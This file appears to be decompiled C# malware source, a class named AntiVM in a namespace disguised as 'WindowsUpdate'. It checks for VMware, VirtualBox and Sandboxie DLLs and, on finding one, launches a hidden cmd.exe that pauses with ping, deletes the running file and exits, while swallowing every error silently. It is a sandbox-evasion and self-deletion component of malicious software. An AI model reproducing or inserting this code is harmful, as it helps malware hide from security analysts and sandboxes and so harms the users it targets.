using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class AntiVM
{
	[DebuggerNonUserCode]
	public AntiVM()
	{
	}

	public void ST(string File)
	{
		try
		{
			if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\vmGuestLib.dll"))
			{
				D(File);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (System.IO.File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxmrxnp.dll"))
			{
				D(File);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (LoadLibrary("SbieDll.dll"))
			{
				D(File);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll")]
	public static extern bool LoadLibrary(string dllToLoad);

	public void D(string F)
	{
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + F + "\"", (AppWinStyle)0, false, -1);
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
